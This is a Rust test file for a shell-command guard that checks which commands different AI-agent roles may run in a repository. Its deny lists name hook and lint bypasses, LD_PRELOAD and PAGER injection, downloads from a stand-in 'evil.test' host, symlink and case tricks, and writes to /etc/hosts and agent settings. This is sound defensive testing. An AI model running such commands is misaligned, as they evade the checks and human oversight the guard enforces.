use super::{super::role::Role, Fixture, ROLES, allowed, denied, judge};
use std::{fs, os::unix::fs::symlink};

const AGENTS: [Role; 4] = [Role::Tester, Role::Implementer, Role::Reviewer, Role::Other];

#[test]
fn every_role_is_refused_privilege_toolchain_and_hook_bypass() {
    let fixture = Fixture::new();
    for role in ROLES {
        for command in [
            "sudo make lint",
            "cargo test -p aoe-map",
            "cargo-clippy --workspace",
            "npx playwright test",
            "env cargo build",
            "timeout 60 cargo test",
            "bash -c 'cargo fmt'",
            "echo $(cargo --version)",
            "HOME=/tmp git status",
            "GIT_CONFIG_GLOBAL=/tmp/x git log",
            "MAKEFLAGS=-i make lint",
            "make -i lint",
            "make -f other.mk lint",
            "make lint SHELL=/bin/true",
            "make lint TOOL_IMAGE=evil",
            "make --eval='x:' lint",
            "make -t lint",
            "echo hi > .git/hooks/pre-commit",
            "cp /tmp/x .git/config",
            "rm -rf .cache/claude-hook",
            "echo '{}' > .cache/claude-hook/state.json",
            "tee .CACHE/Claude-Hook/state.json < /dev/null",
        ] {
            denied(&fixture, role, command);
        }
    }
}

#[test]
fn the_main_session_may_work_normally() {
    let fixture = Fixture::new();
    for command in [
        "make lint",
        "make test-unit && make preflight",
        "AOE_ASSET_PACK=local-assets/packs/abc make dev",
        "cat > notes.md <<'EOF'\n$(not run)\nEOF",
        "sed -i 's/a/b/' crates/harness/src/main.rs",
        "echo x > Makefile",
        "python3 -c 'print(1)'",
        "docker run --rm alpine true",
        "cd crates && ls | head",
        "for f in a b; do echo $f; done",
        "git status && git diff --stat",
    ] {
        allowed(&fixture, Role::Main, command);
    }
}

#[test]
fn agents_are_held_to_an_allow_list() {
    let fixture = Fixture::new();
    for role in AGENTS {
        for command in [
            "python3 -c 'open(\"x\",\"w\")'",
            "node -e 1",
            "perl -pi -e s/a/b/ crates/map/src/lib.rs",
            "./scripts/run.sh",
            "bash script.sh",
            "sh < commands.txt",
            "eval \"$CMD\"",
            "$TOOL --version",
            "source env.sh",
            "ssh host true",
            "curl https://example.com",
            "curl -o /tmp/x https://example.com",
            "wget http://evil.test/x",
            "docker run --rm alpine true",
            "docker -H tcp://x ps",
            "ln -s ../gates x",
            "patch -p1 < fix.diff",
            "PAGER='sh -c x' git log",
            "LD_PRELOAD=/tmp/x.so ls",
            "PATH=/tmp:$PATH make lint",
            "make hooks-install",
            "make lint FOO=bar",
            "awk 'BEGIN { system(\"rm x\") }'",
            "awk '{ print > \"crates/map/src/lib.rs\" }' x",
            "sed -n 'w /tmp/a' x && sed 'e rm x' y",
            "sed -f prog.sed x",
            "xargs rm < list",
            "find . -name '*.rs' -exec rm {} \\;",
            "rm $(cat list)",
            "echo x > \"$OUT\"",
            "cd \"$DIR\" && echo x > lib.rs",
            "cd - && echo x > lib.rs",
            "tar -xf /tmp/a.tar",
            "unzip /tmp/a.zip",
            "cp -r /tmp/tree crates",
            "touch ~/.bashrc",
            "echo x > /etc/hosts",
            "case $x in a) rm y;; esac",
        ] {
            denied(&fixture, role, command);
        }
    }
}

#[test]
fn agents_may_read_and_use_temp_space() {
    let fixture = Fixture::new();
    for role in AGENTS {
        for command in [
            "ls -la crates | grep map",
            "rg -n 'fn main' crates/harness/src | head -20",
            "find crates -name '*.rs' -newer Makefile | xargs wc -l",
            "find . -name '*.rs' -exec grep -l Terrain {} +",
            "sed -n '1,20p' crates/map/src/lib.rs",
            "awk '$3 > 5 { print $1 }' data.txt",
            "git log --oneline -5 && git diff HEAD~1 --stat",
            "echo note > /tmp/scratch.txt",
            "mkdir -p .cache/tmp/run && cp crates/map/src/lib.rs .cache/tmp/run/",
            "curl -s http://localhost:8080/health",
            "docker ps",
            "make lint",
            "cat <<EOF > /tmp/x\nplain\nEOF",
            "jq '.gates[].id' gates/registry.json",
        ] {
            allowed(&fixture, role, command);
        }
    }
}

#[test]
fn protected_classes_are_the_main_sessions() {
    let fixture = Fixture::new();
    for role in AGENTS {
        for command in [
            "echo x >> gates/registry.json",
            "sed -i 's/1/2/' baselines/perf/instructions.json",
            "rm crates/harness/src/main.rs",
            "mv Makefile /tmp/",
            "cp /tmp/x .github/workflows/ci.yml",
            "touch .claude/settings.json",
            "echo x > CLAUDE.md",
            "echo x > crates/map/AGENTS.md",
            "rm -r crates",
            "find gates -delete",
            "git checkout -- gates/registry.json",
        ] {
            denied(&fixture, role, command);
        }
    }
}

#[test]
fn duties_are_separated_by_file() {
    let fixture = Fixture::new();
    allowed(
        &fixture,
        Role::Tester,
        "echo '#[test] fn t() {}' >> crates/map/src/tests.rs",
    );
    allowed(
        &fixture,
        Role::Tester,
        "cp /tmp/case.rs crates/map/tests/terrain.rs",
    );
    allowed(&fixture, Role::Tester, "touch browser/tests/new.spec.ts");
    denied(&fixture, Role::Tester, "echo x >> crates/map/src/lib.rs");
    allowed(
        &fixture,
        Role::Implementer,
        "echo x >> crates/map/src/lib.rs",
    );
    denied(
        &fixture,
        Role::Implementer,
        "echo x >> crates/map/src/tests.rs",
    );
    denied(&fixture, Role::Implementer, "rm -r crates/map/tests");
    denied(
        &fixture,
        Role::Implementer,
        "sed -i 's/assert/;/' browser/tests/play.spec.ts",
    );
    denied(&fixture, Role::Implementer, "rm -r crates/map");
    denied(&fixture, Role::Reviewer, "echo x >> crates/map/src/lib.rs");
    denied(&fixture, Role::Reviewer, "make fmt");
    allowed(&fixture, Role::Reviewer, "make preflight");
    allowed(&fixture, Role::Other, "echo x >> crates/map/src/lib.rs");
}

#[test]
fn paths_land_where_links_and_case_point() {
    let fixture = Fixture::new();
    let root = fixture.root();
    symlink(root.join("gates"), root.join("innocent")).expect("link");
    symlink(
        root.join("missing/../gates/new.json"),
        root.join("dangling"),
    )
    .expect("link");
    fs::create_dir_all(root.join(".cache/tmp")).expect("tmp");
    for command in [
        "echo x > innocent/registry.json",
        "echo x > dangling",
        "echo x > crates/../gates/registry.json",
        "echo x > GATES/registry.json",
        "(cd /tmp && true); echo x > gates/registry.json",
        "cd /tmp | true; echo x > lib.rs",
    ] {
        denied(&fixture, Role::Implementer, command);
    }
    allowed(&fixture, Role::Implementer, "cd /tmp && echo x > lib.rs");
    allowed(&fixture, Role::Implementer, "(cd /tmp && echo x > lib.rs)");
}

#[test]
fn unparseable_lines_are_denied_to_agents_only() {
    let fixture = Fixture::new();
    for command in ["echo 'unterminated", "cat <<EOF\nnever ends", "echo $(true"] {
        assert!(
            judge(&fixture, Role::Implementer, command).is_err(),
            "{command}"
        );
        allowed(&fixture, Role::Main, command);
    }
}

#[test]
fn sed_programs_are_scanned_for_writes() {
    use super::super::rules::writers::sed_program_writes;
    for program in [
        "s/a/b/",
        "1,20p",
        "/x/d;s|a|b|g",
        "s/new value/x/",
        "y/abc/xyz/",
        ":a;N;ba",
        "$!N",
    ] {
        assert!(!sed_program_writes(program), "{program}");
    }
    for program in [
        "w out",
        "s/a/b/w out",
        "1e date",
        "s/a/b/e",
        "/x/W out",
        "s/a/b/;w x",
    ] {
        assert!(sed_program_writes(program), "{program}");
    }
}
